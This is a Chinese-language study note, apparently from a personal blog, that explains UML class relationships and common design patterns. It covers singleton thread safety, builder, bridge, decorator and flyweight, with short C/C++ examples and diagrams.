<h2 id="UML类图"><a href="#UML类图" class="headerlink" title="UML类图"></a>UML类图</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409093149630.png" alt="image-20250409093149630"></p>
<table>
<thead>
<tr>
<th>类关系</th>
<th>解释</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>继承</td>
<td>继承一个父类</td>
<td>鸟类继承动物类</td>
</tr>
<tr>
<td>实现</td>
<td>实现一个接口</td>
<td>鸟类实现IFlyAble接口</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>依赖</td>
<td>类B作为类A方法的参数\局部变量，在A中临时存在</td>
<td></td>
</tr>
<tr>
<td>关联</td>
<td>类B作为类A的成员变量，在A中永久存在</td>
<td>链表类中有一个附加头节点类的引用</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>聚合</td>
<td>个体可以离开整体存在</td>
<td></td>
</tr>
<tr>
<td>组合</td>
<td>个体和整体共存亡，不可分开</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="设计模式-1"><a href="#设计模式-1" class="headerlink" title="设计模式"></a>设计模式</h2><h3 id="创建型模式"><a href="#创建型模式" class="headerlink" title="创建型模式"></a>创建型模式</h3><p>创建对象同时隐藏创建逻辑，避免直接使用new运算符</p>
<h4 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h4><h5 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h5><p>简单工厂方法的弊端：违反了开放-封闭原则</p>
<p>简单工厂类需要接受一个类型参数，然后通过switch-case判断返回具体对象</p>
<p>如果要加入新的类型，那么就得改写这个switch-case逻辑，这就违反了开放-封闭原则</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> CashSuper* <span class="title function_">createCash</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; type)</span>&#123;</span><br><span class="line">    CashSuper * cash = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(type==<span class="string">&quot;正常收费&quot;</span>)&#123;</span><br><span class="line">        cash = new CashNormal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;8折收费&quot;</span>)&#123;</span><br><span class="line">        cash = new CashDiscount(<span class="number">0.8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;满20减5&quot;</span>)&#123;</span><br><span class="line">        cash = new CashReturn(<span class="number">20</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cash = new CashNormal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h5><p>工厂方法模式是对简单工厂模式的改进，需要满足开放-封闭原则</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409164116644.png" alt="image-20250409164116644"></p>
<h4 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h4><p>适用场景:</p>
<p>考虑这么一种场景</p>
<p>有两家工厂, 苹果工厂和联想工厂</p>
<p>两家工厂都生产计算机, 智能手机等电子产品</p>
<p>用户想要一款苹果手机</p>
<p>就是有多种品牌系统(在这里是联想和苹果),他们都能生产同种类的产品</p>
<p>此时就可使用抽象工厂模式</p>
<p>抽象工厂模式的实现流程:</p>
<p>1.定义抽象产品类, 在本例中是智能手机和计算机基类. 可以规定产品通用的功能接口, 比如手机可以打电话</p>
<p>2.定义具体产品类, 在本例中是苹果手机,苹果电脑, 联想手机,联想电脑</p>
<p>3.定义抽象工厂类, 规定任意工厂都能生产的产品类型, 在本例中是计算机和智能手机. </p>
<p>4.定义具体工厂类, 具体工厂类实现抽象工厂. 在本例中具体工厂就是苹果工厂和联想工厂. </p>
<p>具体工厂中生产具体产品, 实际上是实现抽象工厂规定的生产接口</p>
<p>抽象工厂规定要生产智能手机</p>
<p>苹果工厂中实现生产苹果手机</p>
<h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>保证一个类只有一个实例, 并提供一个全局访问点</p>
<p>懒汉模式: 在第一次使用单例时才创建它</p>
<p>饿汉模式: 在main函数之前, 也就是程序初始化时创建它</p>
<p>在多线程环境下, 懒汉模式会面临线程安全问题, 但是饿汉不会</p>
<p>因为饿汉创建单例是在main函数之前, 此时绝对不会有多个线程</p>
<p>但是懒汉模式下两个线程可能同时创建单例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SingletonLazy&amp; <span class="title function_">getSingletonLazy</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//进入临界区,可能会有两个线程都判断instance为空然后进来创建对象</span></span><br><span class="line">        instance = new SingletonLazy();	</span><br><span class="line">        <span class="comment">//退出临界区</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="懒汉模式下的线程安全问题"><a href="#懒汉模式下的线程安全问题" class="headerlink" title="懒汉模式下的线程安全问题"></a>懒汉模式下的线程安全问题</h5><p>可以使用双重锁解决这个问题</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> SingletonLazy&amp; <span class="title">getSingletonLazy</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        m.<span class="built_in">lock</span>();		<span class="comment">//static mutex m也是本类唯一的互斥锁</span></span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;	<span class="comment">//再次判断是否已经创建了对象</span></span><br><span class="line">        	instance = <span class="keyword">new</span> <span class="built_in">SingletonLazy</span>();	</span><br><span class="line">    	&#125;</span><br><span class="line">        m.<span class="built_in">unlock</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两次判空的作用是?</p>
<p>加锁和上锁操作开销比较大, 应该尽量避免</p>
<p>假设有两个线程A,B同时通过了第一次判空</p>
<p>A线程首先持有m锁, 并通过了第二次判空, 创建了对象</p>
<p>B线程等A释放m锁后再持有, 此时B判空发现对象已经创建好了, 自己就不用再创建了</p>
<p>如果去掉外层判空, 依然是线程安全, 但是这样会导致, 不管对象是否被创建, 每个线程来了都先等锁, 即使不需要创建对象, 也要无意义等锁</p>
<p>如果去掉内层判空, 就不是线程安全的了, 考虑上述AB两个线程都经过了外层判空, A首先持有锁创建对象, 然后B持有锁看, B都不看是否有对象了就创建.还是会造成线程安全问题</p>
<h5 id="静态局部变量的线程安全性"><a href="#静态局部变量的线程安全性" class="headerlink" title="静态局部变量的线程安全性"></a>静态局部变量的线程安全性</h5><p>c++11之后静态局部变量的初始化是线程安全的</p>
<p>因此懒汉模式直接这样写, 也是线程安全的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SingletonLazy&amp; <span class="title function_">getSingletonLazy</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">static</span> SingletonLazy instance;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现原理:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004012cf &lt;+23&gt;:    lea    rax,[rip+0x2ed2]        # 0x4041a8 &lt;_ZGVZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x00000000004012d6 &lt;+30&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000004012d9 &lt;+33&gt;:    call   0x4010b0 &lt;__cxa_guard_acquire@plt&gt;</span><br><span class="line">0x00000000004012de &lt;+38&gt;:    test   eax,eax</span><br><span class="line">0x00000000004012e0 &lt;+40&gt;:    setne  al</span><br><span class="line">0x00000000004012e3 &lt;+43&gt;:    test   al,al</span><br><span class="line">0x00000000004012e5 &lt;+45&gt;:    je     0x40130b &lt;_ZN13SingletonLazy16getSingletonLazyEv+83&gt;</span><br><span class="line">0x00000000004012e7 &lt;+47&gt;:    mov    r12d,0x0</span><br><span class="line">0x00000000004012ed &lt;+53&gt;:    lea    rax,[rip+0x2eac]        # 0x4041a0 &lt;_ZZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x00000000004012f4 &lt;+60&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000004012f7 &lt;+63&gt;:    call   0x40127e &lt;_ZN13SingletonLazyC2Ev&gt;</span><br><span class="line">0x00000000004012fc &lt;+68&gt;:    lea    rax,[rip+0x2ea5]        # 0x4041a8 &lt;_ZGVZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x0000000000401303 &lt;+75&gt;:    mov    rdi,rax</span><br><span class="line">0x0000000000401306 &lt;+78&gt;:    call   0x401040 &lt;__cxa_guard_release@plt&gt;</span><br></pre></td></tr></table></figure>

<p>在第11行调用构造函数的前后, 编译器自动加上了<code>guard</code></p>
<p><code>guard</code>底层由<code>SYS_futex</code>系统调用实现</p>
<h4 id="✨建造者模式"><a href="#✨建造者模式" class="headerlink" title="✨建造者模式"></a>✨建造者模式</h4><p>设计n个类表现汽车:</p>
<ol>
<li>所有汽车都具备”行驶”的功能 </li>
<li>汽车的”车门数量”可能不同 </li>
<li>汽车按照能源类型分为”燃油车”和”电动车”，燃油车具备”加油”的能力，电动车具备”充电”的能力 </li>
<li>汽车按照用途分为”轿车”和”卡车”，轿车没有额外功能，卡车具备”装载货物”的功能最终一辆4门电动卡车是如何表达的</li>
</ol>
<h5 id="车的组成-桥接模式"><a href="#车的组成-桥接模式" class="headerlink" title="车的组成 - 桥接模式"></a>车的组成 - 桥接模式</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410195428877.png" alt="image-20250410195428877"></p>
<p>所有车辆共有的车门, 引擎, 能源等组件, 均以槽位的形式虚位以待 , 也就是车与这几个组件都是组合关系</p>
<p>车相关的类按照用途划分为卡车类和轿车类, 其中卡车类多一个<code>loaders</code>槽, 用于组合集装箱类 </p>
<h5 id="车的生产-建造者模式"><a href="#车的生产-建造者模式" class="headerlink" title="车的生产 - 建造者模式"></a>车的生产 - 建造者模式</h5><p>用户实际上不关心车辆的构造, 用户只需要关心<code>charge</code>充能和<code>run</code>耗能行驶就够了</p>
<p>用户只需要提出需求“四门电动卡车”, 然后等着提货就完了</p>
<p>对于每种用户需求, 可以建立一个专门的<code>Builder</code>来满足需求</p>
<p>比如<code>ElectricTruckBuilder</code></p>
<p><code>Builder</code>也可以有类体系:</p>
<p><code>AutoBuilder</code>表示所有车辆通用的建造者, 用于组装车辆共有部分比如门</p>
<p><code>TruckBuilder</code>表示卡车类建造者, 用于组装集装箱</p>
<p><code>ElectricTruckBuilder</code>表示电卡车, 在卡车基础上组装电动力</p>
<p>只有具体的建造者类才能实例化, 任何父类都含有抽象方法, 有抽象函数未实现的类实例化无法通过编译.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410202039417.png" alt="image-20250410202039417"></p>
<p>所有建造者应该由一个指导者管理, 决定到底采用哪个构造者, </p>
<p>用户只需要跟指导者说自己想要什么样的车, 指导者去找对应的建造者</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410202558152.png" alt="image-20250410202558152"></p>
<h4 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h4><p>通过一份原型，克隆出多个副本</p>
<p>比如简历，可以打印一份，复印多份</p>
<p>就是继承一个Cloneable接口，实现一个clone函数</p>
<p>根据需要实现深拷贝和浅拷贝</p>
<h3 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h3><p>关注对象之间的组合和关系， 构建灵活且可复用的类和对象结构</p>
<h4 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h4><p>用树形结构管理系统</p>
<p>用户对父节点的操作和对子节点的操作具有一致性</p>
<blockquote>
<p>以语法分析树为例, 各个节点均实现visit接口</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416180301701.png" alt="image-20250416180300050"></p>
<p>Operand就是叶子类</p>
<p>Operator就是内部节点类</p>
<p>这样将内部节点和叶子节点分类讨论, 是<strong>安全模式</strong></p>
<p>如果将叶子节点也归为内部节点, 不再分类讨论, 则变成了<strong>透明模式</strong>, 此时实际上的叶子节点的handle和getBase等函数没有意义</p>
</blockquote>
<p>问题场景:</p>
<p>描述如下公司结构</p>
<p>总部有自己的人力和财务, 总部还管理多个分公司</p>
<p>分公司也有自己的人力和财务,分公司管理多个办事处</p>
<p>办事处也有自己的人力和财务</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416170147209.png" alt="image-20250416170042003"></p>
<h5 id="透明模式"><a href="#透明模式" class="headerlink" title="透明模式"></a>透明模式</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250418165848591.png" alt="image-20250416185347833"></p>
<p>这样实现的不足之处是, 人力, 财政等部门, 没有子部门或者子公司, </p>
<p><code>departments</code>成员和<code>addDepartment</code>方法不应该被继承. 违反了里氏替换原则</p>
<h5 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416191542638.png" alt="image-20250416191540906"></p>
<h4 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h4><p>将一个类的接口按需求转换为另一个类的接口</p>
<p>电源适配器:不管入户电压多少伏都转换为需要的电压比如36v</p>
<p>deque改成queue</p>
<p>vector改成stack</p>
<p>用户需求的接口以Target接口给出</p>
<p>Adapter类实现Target接口</p>
<p>Adapter类内部封装一个Adaptee类</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412230048356.png" alt="image-20250412230046970"></p>
<h4 id="✨桥接模式"><a href="#✨桥接模式" class="headerlink" title="✨桥接模式"></a>✨桥接模式</h4><p>本节最初描述了这么一件事情：</p>
<p>1.不同品牌的手机</p>
<p>2.每种手机都有mp3，游戏，通讯录等等功能</p>
<p>最初的设计方式是纯使用继承实现</p>
<p>有两种继承设计方案， 一个是品牌在高层，一个是功能在高层</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418145111883.png" alt="image-20250418145111883"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418145117103.png" alt="image-20250418145117103"></p>
<p>但是这样设计就会面临一个问题：</p>
<p>当有新品牌手机出现， 或者新手机功能出现时， 会导致类的数量急剧膨胀</p>
<blockquote>
<p>书上是这样说的:</p>
<p>“是呀，就像我刚开始学会用面向对象的继承时，感觉它既新颖又功能强大，所以只要可以用，就都用上继承。这就好比是‘有了新锤子，所有的东西看上去都成了钉子。”</p>
</blockquote>
<p>这说的太对了。</p>
<p>然而仔细考虑这种继承关系的缺点：</p>
<p>编译时就确定了子类和父类的继承关系，导致子类和父类必然有紧密的依赖关系，父类的改动必然导致子类的改动。</p>
<p><strong>因此设计模式中的另一条设计原则：合成&#x2F;聚合复用原则</strong></p>
<p><strong>仔细考虑还违反了单一职责原则，通过继承增加的新功能，就是在增加类的职责。</strong></p>
<p><strong>因此这个情景应该用聚合解决</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418150949353.png" alt="image-20250418150949353"></p>
<p>手机是主体， 不管什么品牌， 都可以安装不同的软件， 软件可以视为主体上的空槽，可以任意安装</p>
<blockquote>
<p>考虑四门电动卡车问题时，实际上也是这个情况</p>
<p>按照能源继承后按照用途继承或者按照用途继承后按照能源继承，都是滥用继承设计</p>
<p>应该将车看成主体，将动力系统，运载系统等等看成槽位。空槽可以自定义添加模块.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410195428877.png" alt="桥接模式指导的车辆设计"></p>
<p>这里Auto表示汽车类， Car和Truck表示汽车品牌</p>
<p>将Door，Engine，Container等等视为汽车的配件槽</p>
</blockquote>
<p><strong>实现系统可能有多角度分类，每一种分</strong></p>
<p><strong>类都有可能变化，那么就把这种多角度分离出来让它们独立变化，</strong></p>
<p><strong>减少它们之间的耦合</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/85ad1d5793224b6b0f9e0c73527d93db.png" alt="桥接模式"></p>
<h4 id="装饰模式-咖啡点单"><a href="#装饰模式-咖啡点单" class="headerlink" title="装饰模式 - 咖啡点单"></a>装饰模式 - 咖啡点单</h4><p>考虑如下场景:</p>
<p>形象设计, 人有多种衣服可以穿, 可以只穿一条裤衩子, 也可以穿地全副武装, 也可以裤衩子外穿装超人.</p>
<p>最初我的设计是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Wear&#123;&#125;;</span><br><span class="line">class UpWear : Wear&#123;&#125;;</span><br><span class="line">class UnderWear: Wear&#123;&#125;;</span><br><span class="line">class FootWear: Wear&#123;&#125;;</span><br><span class="line">class Avator&#123;</span><br><span class="line">	UpWear * upwear;</span><br><span class="line">	UnderWear * underwear;</span><br><span class="line">	FootWear * footwear;</span><br><span class="line">	void setUpWear(UpWear *up);</span><br><span class="line">	void setDownWear(DownWear *downwear);</span><br><span class="line">	void setFootWear(FootWear *footwear);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然而这样设计的问题是:</p>
<p>1.人不一定只穿一件上衣, 可能穿了秋衣然后又穿了外套, 甚至可以不穿上衣</p>
<p>2.没法体现穿衣服的先后顺序</p>
<p>3.假设现在有一种新的装饰, 戒指Ring类, 那么Avator类无法表示</p>
<p>也就是说, 我们不能预估人会穿多少装饰物, 可能一件不穿, 可能穿的雍容华贵</p>
<p>我们不能站在人自己的角度来聚合装扮</p>
<p>应该站在装扮的角度往一个木偶身上套娃</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(木偶)</span><br><span class="line">((木偶),内裤)</span><br><span class="line">(((木偶),内裤),帆布鞋)</span><br><span class="line">((((木偶),内裤),帆布鞋),牛仔裤)</span><br></pre></td></tr></table></figure>

<p>对于每个装饰物来说, 他只需要知道目前套娃什么样, 然后自己套上去, 成为新的套娃</p>
<p>类似的思想也可以用于咖啡点单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(美式)</span><br><span class="line">((美式),加糖)</span><br><span class="line">(((美式),加糖),加冰)</span><br><span class="line">((((美式),加糖),加冰),加糖)</span><br><span class="line">(((((美式),加糖),加冰),加糖),加牛奶)</span><br></pre></td></tr></table></figure>

<p>那么这种模式应该如何表示呢</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412132801382.png" alt="image-20250409095133753"></p>
<p>这里ConcreteComponent就是最初的美式, 也就是套娃的核</p>
<p>然后加糖加冰加牛奶都是Decorator的子类, 每个表示一层套娃</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409112822371.png" alt="image-20250409112822371"></p>
<p>此后如果有新的咖啡，比如卡布奇诺，继承Coffee兵实现toString即可</p>
<p>如果有新的口味，比如椰果，继承Flavour并实现getName即可</p>
<h4 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h4><p>子系统对外不可见, 由外观类Facade对外提供接口提供访问, 客户不需要关心子系统细节</p>
<p>Facade相当于一个高级代理</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409203910376.png" alt="image-20250409203910376"></p>
<p>外观模式和代理模式的区别:</p>
<p>代理类只对一个实际对象进行代理, 更加专一</p>
<p>但是外观类中管理了很多子系统, 并提供不同方法组合对一个或多个子系统的调用</p>
<p>外观模式可以用在基金和股票场景中</p>
<p>客户是白痴理财人</p>
<p>股票是子系统</p>
<p>基金是外观类</p>
<p>基金经理会挑选几只股票押宝, 不再一棵树上吊死. 对应到外观类可以组合子系统的调用</p>
<p>客户只需要和基金经理打交道, 买入或者卖出. 对应到客户类只需要访问外观类提供的接口</p>
<h4 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h4><p>享元模式，<code>FlyWeight</code>，实际上是轻量级的意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * a = <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">    <span class="type">char</span> * b = <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">    assert(a == b);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;(<span class="type">size_t</span> *)a&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(<span class="type">size_t</span>*)b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上编译器在rodata段只会生成一个“helloworld”字符串，而不是两个</p>
<p>a和b指针实际上指向相同的内存地址</p>
<p>类似的场景有写时复制：</p>
<p><strong>写时复制</strong>（<strong>Copy-on-write</strong>，简称<strong>COW</strong>）是一种计算机<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88">程序设计</a>领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这过程对其他的调用者都是<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E9%80%8F%E6%98%8E">透明</a>的。此作法主要的优点是如果调用者没有修改该资源，就不会有副本（private copy）被创建，因此多个调用者只是读取操作时可以共享同一份资源。</p>
<p>享元模式实际上是工厂模式的改进, 工厂会记忆用户的需求</p>
<p>如果相同的需求之前已经满足过了, 那么直接返回之前构建的对象</p>
<p>如果是新需求则创建新对象</p>
<h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p>书上举得这个例子实在不怎么样，别天天折磨人家女娃了，纯人机</p>
<p>意思就是给RealSubject类裹了一层Proxy代理类，代理类实现相同的Request接口</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409151837450.png" alt="image-20250409151837450"></p>
<p>这个代理类在执行Request动作前后可以自己增加pre和post操作</p>
<h3 id="行为型模式"><a href="#行为型模式" class="headerlink" title="行为型模式"></a>行为型模式</h3><p>关注对象之间的通信与交互，解决对象之间的责任分配与算法封装</p>
<h4 id="模板方法模式"><a href="#模板方法模式" class="headerlink" title="模板方法模式"></a>模板方法模式</h4><p>不变的部分搬到父类</p>
<p>去除子类中的重复代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flavour</span> :</span>public  Component&#123;      <span class="comment">//Decorator</span></span><br><span class="line">    private:</span><br><span class="line">    Component* component;</span><br><span class="line">    public:</span><br><span class="line">    <span class="type">void</span> <span class="title function_">setComponent</span><span class="params">(Component* c)</span>&#123;</span><br><span class="line">        component = c;</span><br><span class="line">    &#125;</span><br><span class="line">    virtual <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Flavour&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str = format(<span class="string">&quot;(&#123;0&#125;),&#123;1&#125;&quot;</span>,component-&gt;toString(),getName());</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ice</span>:</span> public Flavour&#123;</span><br><span class="line">    public:</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Ice&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Milk</span>:</span>public Flavour&#123;</span><br><span class="line">    public:</span><br><span class="line">    <span class="built_in">string</span> <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Milk&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里getName就是模板方法</p>
<h4 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412132737631.png" alt="image-20250411165606763"></p>
<p>发布者-订阅者模式</p>
<h4 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h4><p>控制一个对象状态转移的表达式<strong>过于复杂时</strong>(如果简单就不需要用状态模式)</p>
<p>将状态判断的if-else逻辑, 转移到表示不同状态的一系列<strong>类中表示</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250418165848590.png" alt="image-20250412143515765"></p>
<h4 id="备忘录模式"><a href="#备忘录模式" class="headerlink" title="备忘录模式"></a>备忘录模式</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416165605748.png" alt="image-20250416165603725"></p>
<h4 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h4><h4 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h4><p>命令模式将一个请求封装为一个对象, 对象数组就能模拟请求队列, 可以实现延迟请求, 请求排队</p>
<p>同时, 将请求对象化, 方便了记录请求日志, 对象记录请求内容, 也就支持了撤销操作</p>
